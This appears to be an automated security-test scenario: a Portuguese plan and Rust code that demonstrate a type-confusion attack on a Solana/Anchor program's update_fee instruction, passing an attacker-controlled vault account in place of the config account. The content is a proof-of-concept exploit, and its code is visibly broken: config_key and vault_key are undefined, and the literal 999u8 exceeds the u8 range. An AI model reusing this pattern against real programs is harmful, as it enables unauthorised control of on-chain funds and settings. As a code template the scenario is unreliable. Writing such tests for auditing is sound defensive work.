{
  "plan": "O cenário monta uma conta `config` legítima com o layout esperado (discriminador de config + admin + fee) e uma conta de outro tipo (ex.: vault) cujo layout tem, nos bytes 8..40, a pubkey do atacante. O baseline chama `update_fee` com a conta de config legítima e a autoridade correta, provando que o cenário está correto. O ataque chama `update_fee` passando a conta de vault no lugar da config, com o atacante como signer. O efeito mede se o fee foi gravado na conta de vault (bytes 40..48), demonstrando que uma conta de tipo incorreto foi aceita como config.",
  "scenario": "let program_id = env.program_id;

// Conta de config legítima: discriminador de config + admin + fee inicial
let admin = Pubkey::new_unique();
let config_data = anchor_account_data("Config", &(admin, 100u64));
let config = account(&program_id, &config_data, None);

// Conta de outro tipo (vault) com layout compatível: bytes 8..40 = pubkey do atacante
let attacker = Pubkey::new_unique();
let vault_data = anchor_account_data("Vault", &(attacker, 0u64));
let vault = account(&program_id, &vault_data, None);

// Conta de autoridade legítima (admin)
let authority = wallet(1_000_000_000);

// Baseline: uso legítimo com a conta de config correta
let ix_baseline = env.raw_ix(&[0u8, 50u8, 0, 0, 0, 0, 0, 0, 0], &[
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(admin, true),
]);
let contas_baseline = &[
    (config_key, config.clone()),
    (admin, authority.clone()),
];
let r_base = env.baseline("update_fee legítimo", &ix_baseline, contas_baseline);

// Ataque: passa a conta de vault no lugar da config, com o atacante como signer
let ix_attack = env.raw_ix(&[0u8, 999u8, 0, 0, 0, 0, 0, 0, 0], &[
    AccountMeta::new(vault_key, false),
    AccountMeta::new_readonly(attacker, true),
]);
let contas_attack = &[
    (vault_key, vault.clone()),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com conta de vault", &ix_attack, contas_attack);

if r.program_result == ProgramResult::Success {
    let vault_after = after(&r, &vault_key);
    env.effect("fee gravado na conta de vault (tipo incorreto)", read_u64(vault_after.data(), 40) == 999);
}"
}

